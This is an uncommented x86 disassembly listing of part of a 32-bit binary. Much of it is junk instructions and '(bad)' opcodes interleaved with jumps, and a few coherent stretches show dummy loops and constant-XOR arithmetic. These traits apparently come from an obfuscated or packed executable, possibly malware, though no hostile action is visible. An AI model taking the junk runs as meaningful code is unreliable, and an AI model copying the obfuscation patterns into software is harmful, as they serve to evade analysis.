  40a85b:	mov    cl,0x25
  40a85d:	dec    edi
  40a85e:	daa    
  40a85f:	cdq    
  40a860:	cs dec esp
  40a862:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a863:	pop    esp
  40a864:	or     bl,BYTE PTR [eax]
  40a866:	dec    edx
  40a867:	xor    esi,DWORD PTR fs:[ebx]
  40a86a:	xor    al,0xb5
  40a86c:	inc    ebx
  40a86d:	mov    bl,0x30
  40a86f:	pusha  
  40a870:	jns    0x40a812
  40a872:	ss int 0x4a
  40a875:	frstpm(287 only) 
  40a877:	sbb    cl,ah
  40a879:	loope  0x40a88c
  40a87b:	lock or ebp,DWORD PTR [edx+esi*2+0x7d]
  40a880:	add    DWORD PTR [ebx+0x69deacd3],0x19
  40a887:	add    DWORD PTR [edi],esi
  40a889:	in     eax,dx
  40a88a:	ss mov esi,0x1455381b
  40a890:	pop    ebx
  40a891:	cs jno 0x40a87a
  40a894:	jge    0x40a83f
  40a896:	mul    DWORD PTR [eax+0x5b]
  40a899:	js     0x40a8d5
  40a89b:	mov    ah,0x29
  40a89d:	xlat   BYTE PTR ds:[ebx]
  40a89e:	inc    edx
  40a89f:	int3   
  40a8a0:	gs mov esp,0xda745dff
  40a8a6:	adc    esi,edi
  40a8a8:	mov    ds:0x19881cd2,al
  40a8ad:	jae    0x40a854
  40a8af:	shl    DWORD PTR [esi-0x1c],cl
  40a8b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8b3:	pop    edx
  40a8b4:	imul   edi,DWORD PTR [ebp-0xbc6cc5d],0x59d9bd71
  40a8be:	dec    esp
  40a8bf:	aam    0xd7
  40a8c1:	not    cl
  40a8c3:	stc    
  40a8c4:	arpl   WORD PTR [eax+edx*4],bx
  40a8c7:	adc    DWORD PTR [eax-0x65],edi
  40a8ca:	rcr    ebp,1
  40a8cc:	xor    DWORD PTR [ecx-0x15],esi
  40a8cf:	pop    ecx
  40a8d0:	jo     0x40a8f9
  40a8d2:	pop    edx
  40a8d3:	mov    dh,0xf0
  40a8d5:	pop    ebp
  40a8d6:	sub    edi,edx
  40a8d8:	ins    DWORD PTR es:[edi],dx
  40a8d9:	sub    DWORD PTR [edx+0x14bed071],0xffffffba
  40a8e0:	jle    0x40a909
  40a8e2:	outs   dx,BYTE PTR ds:[esi]
  40a8e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8e4:	mov    ch,0x32
  40a8e6:	sub    edx,DWORD PTR [esi]
  40a8e8:	adc    edx,ebx
  40a8ea:	jnp    0x40a87d
  40a8ec:	cs ret 0x6c91
  40a8f0:	add    BYTE PTR [ebx+0x493a915a],dl
  40a8f6:	pop    ebp
  40a8f7:	ins    BYTE PTR es:[edi],dx
  40a8f8:	add    al,0xa8
  40a8fa:	fdivr  DWORD PTR [edi+0x45]
  40a8fd:	(bad)  
  40a8fe:	dec    eax
  40a8ff:	adc    DWORD PTR [edi+0x61],0xffffff95
  40a903:	xchg   BYTE PTR [ebp+0x10e3d8ca],bl
  40a909:	clc    
  40a90a:	xor    DWORD PTR [eax-0x6d88aa05],ebx
  40a910:	push   0xfffffffa
  40a912:	stc    
  40a913:	cmp    al,0x15
  40a915:	out    0xae,al
  40a917:	js     0x40a8f6
  40a919:	sbb    DWORD PTR [ecx],0x56fc458b
  40a91f:	or     DWORD PTR ds:0x41abe2,edx
  40a925:	mov    esi,DWORD PTR [ebp-0x8]
  40a928:	and    DWORD PTR ds:0x412370,0x0
  40a932:	mov    ecx,DWORD PTR ds:0x412370
  40a938:	inc    ecx
  40a939:	mov    DWORD PTR ds:0x412370,ecx
  40a93f:	cmp    DWORD PTR ds:0x412370,0x26
  40a946:	jne    0x40a962
  40a94c:	push   DWORD PTR [ebp-0x14]
  40a94f:	push   DWORD PTR [ebp-0x24]
  40a952:	push   0x8e18
  40a957:	push   0x31c8
  40a95c:	call   DWORD PTR ds:0x40d024
  40a962:	cmp    DWORD PTR ds:0x412370,0x1b
  40a969:	jb     0x40a932
  40a96f:	mov    edx,0x7510859
  40a974:	xor    eax,edx
  40a976:	xor    esi,edx
  40a978:	mov    ecx,0x32729f
  40a97d:	add    esi,ecx
  40a97f:	add    eax,ecx
  40a981:	imul   eax,esi
  40a984:	mov    esi,DWORD PTR [ebp+0xc]
  40a987:	cmp    esi,eax
  40a989:	jne    0x40ac95
  40a98f:	mov    eax,DWORD PTR [ebp-0x4]
  40a992:	mov    esi,DWORD PTR [ebp-0x8]
  40a995:	jmp    0x40ab0d
  40a99a:	addr16 jno 0x40a945
  40a99d:	mov    ds:0xc965bb78,eax
  40a9a2:	jl     0x40a9a2
  40a9a4:	arpl   bx,dx
  40a9a6:	adc    DWORD PTR [ecx+0x6e],ecx
  40a9a9:	fsubrp st(0),st
  40a9ab:	cmp    bh,BYTE PTR [esi+0x7e]
  40a9ae:	lds    edi,FWORD PTR [edi+0x7e]
  40a9b1:	jle    0x40aa0c
  40a9b3:	and    eax,0x40cdde74
  40a9b8:	ja     0x40a98a
  40a9ba:	in     eax,dx
  40a9bb:	fst    QWORD PTR [edi+eiz*2]
  40a9be:	xor    DWORD PTR [edi-0x53fca071],ecx
  40a9c4:	or     al,0x7a
  40a9c6:	test   BYTE PTR [ebx+0x70],0x2a
  40a9ca:	jg     0x40a9f0
  40a9cc:	sub    ch,BYTE PTR [edi+eiz*2+0x7]
  40a9d0:	out    0x63,al
  40a9d2:	(bad)  
  40a9d3:	loope  0x40a9ab
  40a9d5:	add    eax,0x16940b85
  40a9da:	add    DWORD PTR [edx],edi
  40a9dc:	rol    DWORD PTR [eax],cl
  40a9de:	adc    DWORD PTR [ebp+0x16],0xa9c63c38
  40a9e5:	add    DWORD PTR [edx+0x5b5beb5c],0x41
  40a9ec:	out    dx,al
  40a9ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9ee:	inc    ebx
  40a9ef:	adc    BYTE PTR [edx+ebp*8-0x48b2cf72],cl
  40a9f6:	in     eax,dx
  40a9f7:	sbb    BYTE PTR [ebx+eax*8],cl
  40a9fa:	xor    DWORD PTR ds:0xc4f38568,ecx
  40aa00:	mov    bh,0xb
  40aa02:	clc    
  40aa03:	inc    edi
  40aa04:	popf   
  40aa05:	jbe    0x40a9c1
  40aa07:	xchg   DWORD PTR [ebp+0x59],edx
  40aa0a:	add    dl,bh
  40aa0c:	mov    ebx,0x18a32039
  40aa11:	xor    ecx,ebp
  40aa13:	mov    esi,0xab15b3c0
  40aa18:	dec    eax
  40aa19:	rol    BYTE PTR [ebx],1
  40aa1b:	and    BYTE PTR [edi+0x62],dh
  40aa1e:	dec    ebp
  40aa1f:	lea    esi,[esi-0x37410b53]
  40aa25:	inc    ebp
  40aa26:	or     al,0x14
  40aa28:	xor    al,BYTE PTR [edi-0x60f17e29]
  40aa2e:	in     al,dx
  40aa2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa30:	fidiv  WORD PTR [edx-0x39]
  40aa33:	mov    esp,cs
  40aa35:	fisttp DWORD PTR [ebp-0x5f]
  40aa38:	xchg   ecx,esi
  40aa3a:	test   al,0xb0
  40aa3c:	(bad)  
  40aa3d:	loope  0x40aa7d
  40aa3f:	dec    ecx
  40aa40:	ja     0x40aab5
  40aa42:	stos   DWORD PTR es:[edi],eax
  40aa43:	retf   
  40aa44:	outs   dx,BYTE PTR ds:[esi]
  40aa45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa46:	clc    
  40aa47:	ret    
  40aa48:	lea    edi,[edi+ecx*2-0x63673560]
  40aa4f:	inc    ebx
  40aa50:	cs aas 
  40aa52:	fstp   DWORD PTR [eax]
  40aa54:	jle    0x40aacd
  40aa56:	iret   
  40aa57:	mov    ah,0x10
  40aa59:	pusha  
  40aa5a:	mov    eax,0xedec776f
  40aa5f:	push   ebx
  40aa60:	sbb    edx,DWORD PTR [edi]
  40aa62:	fldz   
  40aa64:	mov    gs,WORD PTR [edi+0x12]
  40aa67:	je     0x40aa15
  40aa69:	adc    dl,BYTE PTR [edx-0x715fecad]
  40aa6f:	loop   0x40aae1
  40aa71:	int    0x40
  40aa73:	xchg   edx,eax
  40aa74:	jo     0x40aab1
  40aa76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa77:	mov    edx,0x1052c2e5
  40aa7c:	outs   dx,DWORD PTR ds:[esi]
  40aa7d:	add    DWORD PTR [ebp*2+0x426f9ce2],0x6a
  40aa85:	or     esi,DWORD PTR [ecx+0x4baa11e6]
  40aa8b:	pop    edx
  40aa8c:	int3   
  40aa8d:	sbb    BYTE PTR [ecx],0x48
  40aa90:	retf   
  40aa91:	add    bl,al
  40aa93:	shr    DWORD PTR [ebp+0x2e01129],0x7c
  40aa9a:	mov    al,ch
  40aa9c:	call   0x217ae53a
  40aaa1:	jne    0x40ab12
  40aaa3:	(bad)  
  40aaa4:	call   0x4d66:0x60ca6bde
  40aaab:	push   ebp
  40aaac:	sbb    dh,bh
  40aaae:	mov    WORD PTR [ebp+ebp*1+0x75],gs
  40aab2:	jle    0x40aae9
  40aab4:	lock jae 0x40aa7e
  40aab7:	aam    0x2b
  40aab9:	retf   
  40aaba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aabb:	dec    edx
  40aabc:	out    0x28,al
  40aabe:	pop    edi
  40aabf:	iret   
  40aac0:	mov    ecx,0x2cbde6ee
  40aac5:	jmp    0x28c09420
  40aaca:	stos   DWORD PTR es:[edi],eax
  40aacb:	(bad)  
  40aacd:	(bad)  
  40aace:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aacf:	mov    ah,bh
  40aad1:	ret    
  40aad2:	pushf  
  40aad3:	push   0x6a
  40aad5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aad6:	mov    BYTE PTR [ebp+eax*8-0xc],bl
  40aada:	sbb    BYTE PTR [esi+0x11952bb5],dl
  40aae0:	fild   DWORD PTR [eax+0x53]
  40aae3:	cdq    
  40aae4:	mov    esi,0x5c531a4b
  40aae9:	jle    0x40ab47
  40aaeb:	dec    edi
  40aaec:	fbld   TBYTE PTR [edx+eax*2+0x4dfaf085]
  40aaf3:	mov    ch,0x18
  40aaf5:	sar    ebx,1
  40aaf7:	push   eax
  40aaf8:	(bad)  
  40aaf9:	mov    ebx,0x9da7af71
  40aafe:	dec    esi
  40aaff:	push   edx
  40ab00:	loope  0x40aabc
  40ab02:	(bad)
  40ab05:	in     al,0x9e
  40ab07:	mov    al,0x35
  40ab09:	inc    edi
  40ab0a:	lahf   
  40ab0b:	dec    ebx
  40ab0c:	shl    DWORD PTR [ebx],1
  40ab0e:	ret    0xf233
  40ab11:	add    eax,ecx
  40ab13:	jmp    0x40ac8b
  40ab18:	jg     0x40aacf
  40ab1a:	add    eax,0x117b453b
  40ab1f:	jns    0x40aab9
  40ab21:	cmp    eax,0xb226ac8b
  40ab26:	outs   dx,BYTE PTR ds:[esi]
  40ab27:	pop    esp
  40ab28:	dec    edi
  40ab29:	cmp    edi,DWORD PTR [esi+0x7e]
  40ab2c:	lds    edi,FWORD PTR [edi+0x7e]
  40ab2f:	jle    0x40aac1
  40ab31:	mov    ch,0xbf
  40ab33:	test   DWORD PTR [edx+0x2b],esp
  40ab36:	sub    ecx,ebp
  40ab38:	nop
  40ab39:	addr16 add eax,0xd3d34d32
  40ab3f:	rol    BYTE PTR ss:[ebp+0x3cfac69a],cl
  40ab46:	sahf   
  40ab47:	and    bh,BYTE PTR [ebx]
  40ab49:	sbb    DWORD PTR [ecx-0x7f],0x6ce5ffe4
  40ab50:	add    ebx,ecx
  40ab52:	call   0xc00d:0xc26c6c5a
  40ab59:	fwait
  40ab5a:	lds    esi,FWORD PTR [ecx+eiz*4-0x7f531dd]
  40ab61:	add    eax,0xfccea0c3
  40ab66:	addr16 retf 0x24d6
  40ab6a:	leave  
  40ab6b:	jbe    0x40ab84
  40ab6d:	adc    dl,BYTE PTR [edi+0x17]
  40ab70:	scas   eax,DWORD PTR es:[edi]
  40ab71:	aad    0xc
  40ab73:	and    ebx,DWORD PTR [esi-0x6b]
  40ab76:	mov    al,ds:0xa7ef86dc
  40ab7b:	ret    0x4e68
  40ab7e:	xchg   ebx,eax
  40ab7f:	jb     0x40abfd
  40ab81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab82:	push   esi
  40ab83:	or     BYTE PTR [esp-0x8],ch
  40ab87:	pop    edi
  40ab88:	sbb    DWORD PTR [edx+0x1a],edi
  40ab8b:	xchg   edi,esp
  40ab8d:	pop    esp
  40ab8e:	sbb    edx,esp
  40ab90:	jns    0x40ab99
  40ab92:	pushf  
  40ab93:	push   ss
  40ab94:	ins    DWORD PTR es:[edi],dx
  40ab95:	jnp    0x40abc2
  40ab97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab98:	ja     0x40ab4e
  40ab9a:	aad    0xa3
  40ab9c:	out    dx,eax
  40ab9d:	adc    dl,BYTE PTR [ecx]
  40ab9f:	bnd je 0x40ab53
  40aba2:	rol    DWORD PTR [edi],0xd3
  40aba5:	arpl   di,si
  40aba7:	dec    edx
  40aba8:	xchg   ecx,eax
  40aba9:	in     eax,0xad
  40abab:	shl    cl,1
  40abad:	push   edi
  40abae:	mov    ds:0xed5cf585,al
  40abb3:	imul   ebp,edi,0x45
  40abb6:	inc    ecx
  40abb7:	push   edx
  40abb8:	pop    ecx
  40abb9:	test   eax,0x87de98d
  40abbe:	in     al,0xf5
  40abc0:	not    DWORD PTR [eax+0x8]
  40abc3:	jl     0x40ab92
  40abc5:	int3   
  40abc6:	out    0x1a,al
  40abc8:	loope  0x40abdc
  40abca:	test   BYTE PTR [edx-0x6],bl
  40abcd:	lock ds jns 0x40ac05
  40abd1:	ins    BYTE PTR es:[edi],dx
  40abd2:	bound  edi,QWORD PTR [esi-0x1d25bb9f]
  40abd8:	mov    bl,0x8a
  40abda:	in     al,0xaf
  40abdc:	in     al,0x23
  40abde:	xor    DWORD PTR [edx+0x4],ebx
  40abe1:	mov    ebx,DWORD PTR ds:0xfe758503
  40abe7:	xchg   ebx,eax
  40abe8:	pop    ebx
  40abe9:	call   0xdd09:0x20d0
  40abef:	shr    BYTE PTR [esi],1
  40abf1:	mov    bl,BYTE PTR [ecx+ebp*1-0x6c8452cd]
  40abf8:	aaa    
  40abf9:	in     eax,0xe1
  40abfb:	std    
  40abfc:	inc    edx
  40abfd:	mov    dh,0xb4
  40abff:	xchg   esp,esi
  40ac01:	loope  0x40ac7b
  40ac03:	xlat   BYTE PTR ds:[ebx]
  40ac04:	jne    0x40ac44
  40ac06:	sbb    ebx,ecx
  40ac08:	aas    
  40ac09:	shl    BYTE PTR [edx],0x53
  40ac0c:	mov    ds:0xf42a4429,al
  40ac11:	nop
  40ac12:	pop    ebx
  40ac13:	(bad)  
  40ac14:	cwde   
  40ac15:	xchg   ecx,eax
  40ac16:	pop    ebp
  40ac17:	rol    DWORD PTR [esi+0x8],0x5e
  40ac1b:	adc    eax,0xd66bc615
  40ac20:	xchg   ecx,esi
  40ac22:	xchg   esp,eax
  40ac23:	jo     0x40ac69
  40ac25:	pop    esp
  40ac26:	out    0xb4,eax
  40ac28:	cmc    
  40ac29:	cmp    BYTE PTR ds:0x2fe12f76,bl
  40ac2f:	aam    0xea
  40ac31:	add    al,0x22
  40ac33:	std    
  40ac34:	cmp    bl,BYTE PTR [esi+esi*1]
  40ac37:	xlat   BYTE PTR ds:[ebx]
  40ac38:	stos   BYTE PTR es:[edi],al
  40ac39:	push   esp
  40ac3a:	sub    BYTE PTR [ebp-0x50efb91c],dh
  40ac40:	std    
  40ac41:	aaa    
  40ac42:	pushf  
  40ac43:	shl    dl,cl
  40ac45:	not    DWORD PTR [ebp+0x38f90732]
  40ac4b:	loopne 0x40acc2
  40ac4d:	adc    BYTE PTR [esi],0xf2
  40ac50:	test   eax,0xb45f0b35
  40ac55:	das    
  40ac56:	jns    0x40ac43
  40ac58:	jne    0x40acc5
  40ac5a:	mov    cl,0xf0
  40ac5c:	xor    ebp,DWORD PTR ds:[ebp-0x46]
  40ac60:	inc    ebp
  40ac61:	cmp    al,0x37
  40ac63:	(bad)  
  40ac64:	loope  0x40aca7
  40ac66:	out    0xe7,eax
  40ac68:	fild   WORD PTR [edi]
  40ac6a:	scas   eax,DWORD PTR es:[edi]
  40ac6b:	pop    esi
  40ac6c:	ror    ebp,0x7
  40ac6f:	jmp    0x5af2:0xe3426ce0
  40ac76:	push   ebp
  40ac77:	adc    ah,cl
  40ac79:	(bad)  
  40ac7a:	dec    ebp
  40ac7b:	cmp    bl,bh
  40ac7d:	jns    0x40ac7b
  40ac7f:	inc    ebp
  40ac80:	adc    eax,0xcb80bf67
  40ac85:	popf   
  40ac86:	and    ebx,DWORD PTR [edx-0x31]
  40ac89:	mov    bh,BYTE PTR [esi-0x50f00efd]
  40ac8f:	(bad)  
  40ac90:	jmp    0x40ae48
  40ac95:	mov    eax,DWORD PTR [ebp+0xc]
  40ac98:	mov    eax,DWORD PTR [eax+0x78]
  40ac9b:	mov    DWORD PTR [ebp+0xc],eax
  40ac9e:	mov    eax,DWORD PTR [ebp-0x4]
  40aca1:	mov    esi,DWORD PTR [ebp-0x8]
  40aca4:	xor    eax,edx
  40aca6:	xor    esi,edx
  40aca8:	add    eax,ecx
  40acaa:	jmp    0x40ae22
  40acaf:	push   ss
  40acb0:	mov    esp,0xb169beb3
  40acb5:	sub    edx,DWORD PTR [esp+edx*4-0x31]
  40acb9:	cmc    
  40acba:	sub    edi,DWORD PTR [edi]
  40acbc:	(bad)  
  40acbd:	mov    cl,0xd3
  40acbf:	sub    bh,BYTE PTR [ecx]
  40acc1:	jle    0x40ad41
  40acc3:	lds    edi,FWORD PTR [edi+0x7e]
  40acc6:	jle    0x40ac56
  40acc8:	adc    BYTE PTR [ebp+0x6f],al
  40accb:	xchg   esp,eax
  40accc:	retf   0x96aa
  40accf:	inc    ah
  40acd1:	mov    ds:0x5de710ff,eax
  40acd6:	fcom   QWORD PTR [edx+0x57]
  40acd9:	xchg   ebx,eax
  40acda:	cmp    cl,bl
  40acdc:	pop    ds
  40acdd:	jmp    0x78794b0
  40ace2:	pop    ebx
  40ace3:	inc    eax
  40ace4:	cmovne esp,ecx
  40ace7:	out    dx,al
  40ace8:	(bad)  
  40ace9:	call   FWORD PTR [edx]
  40aceb:	and    ebx,DWORD PTR [edx-0x4a5f359d]
  40acf1:	xlat   BYTE PTR ds:[ebx]
  40acf2:	xchg   BYTE PTR [edi+edx*1+0x7d1965d6],bl
  40acf9:	or     al,0xe4
  40acfb:	nop
  40acfc:	iret   
  40acfd:	sub    ebx,esi
  40acff:	shr    BYTE PTR ds:0x3d70a336,cl
  40ad05:	popf   
  40ad06:	lods   al,BYTE PTR ds:[esi]
  40ad07:	pop    esi
  40ad08:	lds    esp,FWORD PTR [ebx]
  40ad0a:	cmp    eax,0xbc941d52
  40ad0f:	inc    esi
  40ad10:	(bad)  
  40ad11:	ins    DWORD PTR es:[edi],dx
  40ad12:	lahf   
  40ad13:	jne    0x40ad2b
  40ad15:	mov    esi,0x8ccd5235
  40ad1a:	xchg   ebx,eax
  40ad1b:	into   
  40ad1c:	(bad)  
  40ad1d:	mov    esp,0xa91bd9e8
  40ad22:	inc    ebx
  40ad23:	jl     0x40ad44
  40ad25:	mov    bl,BYTE PTR [esi+0x68]
  40ad28:	std    
  40ad29:	div    DWORD PTR fs:[ebx]
  40ad2c:	stos   DWORD PTR es:[edi],eax
  40ad2d:	arpl   WORD PTR [edx],bx
  40ad2f:	pop    edi
  40ad30:	inc    esi
  40ad31:	or     edi,DWORD PTR [ebp+0x7f]
  40ad34:	jno    0x40acc1
  40ad36:	aad    0x13
  40ad38:	mov    ds:0xa106e8bc,eax
  40ad3d:	xchg   DWORD PTR [edx-0x76],edx
  40ad40:	imul   ebp,DWORD PTR [ecx-0x2906eb83],0x6b
  40ad47:	outs   dx,DWORD PTR ds:[esi]
  40ad48:	lds    eax,FWORD PTR [esi]
  40ad4a:	inc    ebp
  40ad4b:	lock fisttp DWORD PTR [ebp+ebx*8-0x17]
  40ad50:	iret   
  40ad51:	dec    esi
  40ad52:	scas   eax,DWORD PTR es:[edi]
  40ad53:	test   dh,cl
  40ad55:	lahf   
  40ad56:	out    dx,eax
  40ad57:	mov    edi,0xc6abd6d2
  40ad5c:	dec    esi
  40ad5d:	and    eax,0xd5b3d90
  40ad62:	push   esp
  40ad63:	stos   BYTE PTR es:[edi],al
  40ad64:	xchg   edi,edi
  40ad66:	dec    ebp
  40ad67:	test   DWORD PTR [edx+0x1e1d8b70],edi
  40ad6d:	mov    ds:0xf74df297,al
  40ad72:	push   es
  40ad73:	push   ds
  40ad74:	mov    edi,0x8a429414
  40ad79:	ficomp DWORD PTR ds:0xbca93b4b
  40ad7f:	shr    BYTE PTR [eax+0x4755b3d4],cl
  40ad85:	push   esi
  40ad86:	dec    edi
  40ad87:	mov    dh,0x48
  40ad89:	pusha  
  40ad8a:	mov    ebp,0x34eee242
  40ad8f:	xor    esp,DWORD PTR [edx-0x126b9976]
  40ad95:	or     bl,BYTE PTR [eax]
  40ad97:	clc    
  40ad98:	out    0xb1,eax
  40ad9a:	mov    ds:0x5b24677,al
  40ad9f:	aad    0xf3
  40ada1:	mov    bl,ah
  40ada3:	xchg   esp,eax
  40ada4:	cmp    edi,DWORD PTR [eax+0x50b9dfd4]
  40adaa:	jae    0x40add6
  40adac:	xchg   ecx,eax
  40adad:	cmp    BYTE PTR es:[edx-0x74e58f0a],ah
  40adb4:	inc    eax
  40adb5:	sub    DWORD PTR [edx],0x50
  40adb8:	or     DWORD PTR [edx],ecx
  40adba:	add    DWORD PTR [ecx],edx
  40adbc:	aas    
  40adbd:	enter  0xa44f,0xa7
  40adc1:	cdq    
  40adc2:	ret    
  40adc3:	jle    0x40adf3
  40adc5:	adc    esi,esi
  40adc7:	(bad)  
  40adc8:	loopne 0x40addd
  40adca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40adcb:	sub    al,0xb
  40adcd:	dec    esp
  40adce:	aad    0xe
  40add0:	and    BYTE PTR [edx-0x29bb0a33],0x5a
  40add7:	xor    al,0x8f
  40add9:	dec    esi
  40adda:	ret    
  40addb:	fstp   QWORD PTR ds:0x260d0d74
  40ade1:	addr16 jo 0x40ae13
  40ade4:	or     cl,al
  40ade6:	sub    eax,0x7cacc435
  40adeb:	stos   DWORD PTR es:[edi],eax
  40adec:	mov    al,ds:0x6e0ad86a
  40adf1:	fst    QWORD PTR [esi+0x44f3baec]
  40adf7:	repz adc esp,ebp
  40adfa:	mov    esp,0xe4d4fdf8
  40adff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae00:	and    al,0xd8
  40ae02:	sub    eax,0x6b3f67eb
  40ae07:	pop    ecx
  40ae08:	aam    0xfd
  40ae0a:	sahf   
  40ae0b:	pop    esi
  40ae0c:	xchg   BYTE PTR [eax-0x3f],al
  40ae0f:	cdq    
  40ae10:	fst    DWORD PTR [edx]
  40ae12:	aaa    
  40ae13:	idiv   BYTE PTR [edi-0x669be1bf]
  40ae19:	bound  ebx,QWORD PTR [esp+edx*2-0x19]
  40ae1d:	push   ebx
  40ae1e:	loop   0x40ae55
  40ae20:	dec    eax
  40ae21:	test   BYTE PTR [ebx],al
  40ae23:	icebp  
  40ae24:	imul   eax,esi
  40ae27:	mov    esi,DWORD PTR [ebp+0xc]
  40ae2a:	cmp    esi,eax
  40ae2c:	mov    eax,DWORD PTR [ebp-0x4]
  40ae2f:	je     0x40a992
  40ae35:	xor    eax,edx
  40ae37:	add    eax,ecx
  40ae39:	mov    ecx,DWORD PTR [ebp+0xc]
  40ae3c:	imul   eax,ecx
  40ae3f:	add    eax,DWORD PTR [ebp+0x8]
  40ae42:	mov    DWORD PTR [ebp+0xc],eax
  40ae45:	mov    eax,DWORD PTR [ebp+0xc]
  40ae48:	pop    esi
  40ae49:	leave  
  40ae4a:	ret    0x8
  40ae4d:	push   ebp
  40ae4e:	mov    ebp,esp
  40ae50:	sub    esp,0x30
  40ae53:	add    DWORD PTR ds:0x41abce,0x682
  40ae5d:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  40ae64:	mov    DWORD PTR [ebp-0x18],0xf89c853b
  40ae6b:	dec    DWORD PTR ds:0x41abde
  40ae71:	mov    ecx,DWORD PTR [ebp-0x4]
  40ae74:	push   ebx
  40ae75:	mov    eax,0x7510859
  40ae7a:	xor    ebx,0x7bf6
  40ae80:	xor    ecx,eax
  40ae82:	jmp    0x40af67
  40ae87:	je     0x40aef6
  40ae89:	jg     0x40aea2
  40ae8b:	addr16 gs adc al,0x6d
  40ae8f:	test   eax,0x2b268d5d
  40ae94:	mov    dh,0x42
  40ae96:	dec    esi
  40ae97:	icebp  
  40ae98:	ds jle 0x40af19
  40ae9b:	mov    dh,0x7e
  40ae9d:	jle    0x40af1d
  40ae9f:	(bad)  
  40aea0:	imul   esi,DWORD PTR [esi],0xffffffd0
  40aea3:	push   ds
  40aea4:	adc    DWORD PTR [ebp-0x5d],0xffffffe0
  40aea8:	xchg   dh,ch
  40aeaa:	and    BYTE PTR [ecx-0x4f],dl
  40aead:	xchg   ebp,eax
  40aeae:	inc    eax
  40aeaf:	push   esi
  40aeb0:	lods   al,BYTE PTR ds:[esi]
  40aeb1:	aas    
  40aeb2:	repz fstp QWORD PTR [ebx-0x16c64edd]
  40aeb9:	pusha  
  40aeba:	cld    
  40aebb:	or     ebp,DWORD PTR [esi]
  40aebd:	in     al,0x79
  40aebf:	xchg   edx,eax
  40aec0:	adc    eax,0x62ff9fe6
  40aec5:	cmc    
  40aec6:	xchg   ebp,eax
  40aec7:	jb     0x40af14
  40aec9:	cwde   
  40aeca:	adc    eax,0x8cc2303b
  40aecf:	jmp    0xc366:0x994d51f6
  40aed6:	stos   BYTE PTR es:[edi],al
  40aed7:	pop    edi
  40aed8:	fidivr DWORD PTR [edx-0x5db96ef]
  40aede:	in     al,dx
  40aedf:	rol    BYTE PTR [ebp-0x34],0x72
  40aee3:	inc    esi
  40aee4:	or     edx,DWORD PTR [ebp+0xd]
  40aee7:	test   eax,0x7eae20c3
  40aeec:	int    0xbc
  40aeee:	xor    ah,0xc5
  40aef1:	and    edi,edx
  40aef3:	cmp    DWORD PTR [edi+0x12],ecx
  40aef6:	enter  0x947f,0x7a
  40aefa:	in     al,dx
  40aefb:	mov    edx,0xc4dde167
  40af00:	push   0x3b7615f3
  40af05:	(bad)  
  40af06:	adc    bl,BYTE PTR [ebx-0x45383742]
  40af0c:	dec    eax
  40af0d:	inc    ebp
  40af0e:	scas   al,BYTE PTR es:[edi]
  40af0f:	nop
  40af10:	fsubr  DWORD PTR ds:0x831b9772
  40af16:	pop    es
  40af17:	retf   0x7bfe
  40af1a:	dec    edx
  40af1b:	repnz sbb BYTE PTR [edi+0x25],al
  40af1f:	imul   DWORD PTR [ecx-0x60]
  40af22:	and    DWORD PTR [esi-0x5e],ecx
  40af25:	xor    al,0xa5
  40af27:	mov    bh,0x87
  40af29:	sti    
  40af2a:	add    bh,BYTE PTR [esi+0x78b1a835]
  40af30:	test   DWORD PTR [eax+ebp*1+0x3dcec222],0x7bec3da9
  40af3b:	jae    0x40aef9
  40af3d:	and    eax,0xba5819c5
  40af42:	mov    ebx,0x806a2a68
  40af47:	fwait
  40af48:	stos   DWORD PTR es:[edi],eax
  40af49:	push   ebp
  40af4a:	scas   eax,DWORD PTR es:[edi]
  40af4b:	xor    eax,0xe36595c8
  40af50:	mov    cl,0x15
  40af52:	jne    0x40afa0
  40af54:	mov    ds:0x423904c1,eax
  40af59:	and    eax,0xda5a433f
  40af5e:	push   0xffffffce
  40af60:	test   eax,0x548926b8
  40af65:	add    BYTE PTR [ebx+edi*4-0x61],cl
  40af69:	jb     0x40af9d
  40af6b:	add    BYTE PTR [ebx],al
  40af6d:	retf   
  40af6e:	and    DWORD PTR ds:0x412370,0x41abce
  40af78:	mov    DWORD PTR [ebp-0x1c],ecx
  40af7b:	mov    DWORD PTR ds:0x41235c,0x5a41
  40af85:	mov    ecx,DWORD PTR [ebp+0x14]
  40af88:	add    DWORD PTR ds:0x41abe6,0x41235c
  40af92:	push   esi
  40af93:	push   edi
  40af94:	or     DWORD PTR ds:0x41510d,0x36ef
  40af9e:	test   ecx,ecx
  40afa0:	je     0x40afae
  40afa6:	mov    ecx,DWORD PTR [ebp+0x14]
  40afa9:	mov    ecx,DWORD PTR [ecx]
  40afab:	mov    DWORD PTR [ebp-0x1c],ecx
  40afae:	movzx  edi,BYTE PTR ds:0x417e3d
  40afb5:	and    DWORD PTR ds:0x417e41,edi
  40afbb:	imul   edx,eax
  40afbe:	sub    DWORD PTR ds:0x412374,ecx
  40afc4:	mov    ecx,0x4573
  40afc9:	and    DWORD PTR ds:0x41abe2,0x0
  40afd3:	mov    esi,DWORD PTR ds:0x41abe2
  40afd9:	inc    esi
  40afda:	mov    DWORD PTR ds:0x41abe2,esi
  40afe0:	cmp    DWORD PTR ds:0x41abe2,0x22
  40afe7:	jne    0x40affd
  40afed:	push   0x2695
  40aff2:	push   0x8176
  40aff7:	call   DWORD PTR ds:0x40d3a0
  40affd:	cmp    DWORD PTR ds:0x41abe2,0x1e
  40b004:	jb     0x40afd3
  40b00a:	add    edx,ecx
  40b00c:	and    DWORD PTR ds:0x41abca,0x0
  40b016:	jmp    0x40b02a
  40b01b:	xor    edi,edi
  40b01d:	xor    edi,DWORD PTR ds:0x41abca
  40b023:	inc    edi
  40b024:	mov    DWORD PTR ds:0x41abca,edi
  40b02a:	cmp    DWORD PTR ds:0x41abca,0x12
  40b031:	jae    0x40b05b
